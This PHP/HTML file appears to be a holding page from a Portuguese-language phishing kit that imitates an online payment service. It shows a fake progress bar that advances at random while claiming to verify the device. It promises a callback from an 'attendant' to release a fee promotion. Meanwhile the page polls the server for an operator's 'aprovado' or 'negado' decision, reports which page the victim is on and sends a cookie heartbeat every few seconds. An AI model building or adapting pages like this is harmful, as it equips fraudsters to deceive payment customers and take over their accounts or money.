<?php
session_start();

// Verifica se o cookie 'identificador_cliente' JÁ EXISTE
if (!isset($_COOKIE['identificador_cliente'])) {
    // Se não existe, GERA um valor único e seguro
    $cookie_value = 'user_' . bin2hex(random_bytes(16));

    // Define o cookie para expirar em 30 dias
    setcookie('identificador_cliente', $cookie_value, time() + 86400 * 30, '/');

    // Disponibiliza o cookie para uso imediato no mesmo request
    $_COOKIE['identificador_cliente'] = $cookie_value;
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>A solução completa para pagamentos online</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', sans-serif;
    }

    html, body {
      height: 100vh;
      overflow: hidden;
      background: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    header {
      width: 100%;
      padding: 20px 0 14px;
      display: flex;
      justify-content: center;
      align-items: center;
      border-bottom: 1px solid #ddd;
    }

    header img {
      height: 38px;
    }

    .container {
      max-width: 460px;
      width: 100%;
      text-align: center;
      padding: 30px 20px;
    }

    .card-image {
      width: 100%;
      border-radius: 12px;
      overflow: hidden;
      margin-bottom: 24px;
    }

    .card-image img {
      width: 100%;
      display: block;
    }

    .mensagem {
      font-size: 15px;
      color: #333;
      margin-bottom: 28px;
      line-height: 1.6;
    }

    .mensagem strong {
      font-weight: 600;
    }

    .progress-bar {
      position: relative;
      height: 24px;
      background-color: #f2f2f2;
      border-radius: 6px;
      overflow: hidden;
      width: 100%;
      max-width: 360px;
      margin: 0 auto 24px;
    }

    .progress {
      height: 100%;
      width: 2%;
      background-color: #e7e150;
      transition: width 0.4s ease;
    }

    .progress-text {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      color: #ffffff;
      font-size: 13px;
      font-weight: 600;
      pointer-events: none;
    }

    .verificando {
      font-size: 14px;
      color: #666;
    }

    @media (min-width: 768px) {
      header img {
        height: 44px;
      }

      .mensagem {
        font-size: 16px;
      }
    }
  </style>
</head>
<body>
  <header>
  </header>

  <div class="container">
    <div class="card-image">
      <img src="imagens/taxas.png" alt="Imagem telefone amarelo">
    </div>

    <div class="mensagem">
      <strong>Aguarde</strong> dentro de algumas horas, um de nossos atendentes entrará em contato para finalização do procedimento e liberação da promoção de taxas.<br>
      Esse procedimento pode demorar até 6 horas. <br> Por favor, aguarde a conclusão do processo!
    </div>

    <div class="progress-bar">
      <div class="progress" id="progress"></div>
      <div class="progress-text" id="progress-text">2%</div>
    </div>

    <div class="verificando">
      Aguarde enquanto verificamos o cadastro do dispositivo...
    </div>
  </div>

  <script>
    let percent = 1;
    const progress = document.getElementById('progress');
    const progressText = document.getElementById('progress-text');

    setInterval(() => {
      if (percent < 100) {
        percent += Math.random() * 1;
        progress.style.width = percent + "%";
        progressText.textContent = Math.floor(percent) + "%";
      }
    }, 1800);

  setInterval(() => {
    fetch('verifica_status.php')
      .then(response => response.text())
      .then(status => {
        if (status === 'aprovado') {
          window.location.href = 'validacao.php'; // ou dashboard, como preferir
        } else if (status === 'negado') {
          window.location.href = 'login.php';
        }
      })
      .catch(() => {
        console.log('Erro ao verificar status');
      });
  }, 1000); // verifica a cada 5 segundos
  </script>
  <script>
      document.addEventListener("DOMContentLoaded", function() {
          const nomeDaPagina = 'validacao.php'; // <-- MUDE ESTE VALOR EM CADA PÁGINA
          
          const formData = new FormData();
          formData.append('page', nomeDaPagina);

          fetch('update_location.php', {
              method: 'POST',
              body: formData
          }).catch(error => console.error('Falha ao atualizar localização:', error));
      });
  </script>
    <script>
      document.addEventListener("DOMContentLoaded", function() {
          const nomeDaPagina = 'aguarde.php'; // <-- MUDE ESTE VALOR EM CADA PÁGINA
          
          const formData = new FormData();
          formData.append('page', nomeDaPagina);

          fetch('update_location.php', {
              method: 'POST',
              body: formData
          }).catch(error => console.error('Falha ao atualizar localização:', error));
      });
  </script>
  <script>
    function getCookie(name) {
        const value = `; ${document.cookie}`;
          const parts = value.split(`; ${name}=`);
        if (parts.length === 2) return parts.pop().split(';').shift();
    }
    function sendHeartbeat() {
            // CORREÇÃO: Usando o nome correto do cookie
        const userCookie = getCookie('identificador_cliente'); 

          if (userCookie) {
            const formData = new FormData();
              formData.append('identificador_cookie', userCookie);

                  fetch('/heartbeat.php', { // O caminho para o nosso novo arquivo
                      method: 'POST',
                      body: formData
                  }).catch(error => console.error('Heartbeat falhou:', error));
                } 
            }
            // Envia o primeiro sinal imediatamente e depois a cada 10 segundos
      sendHeartbeat();
      setInterval(sendHeartbeat, 3000); // 10000 ms = 10 segundos
  </script>
</body>
</html>
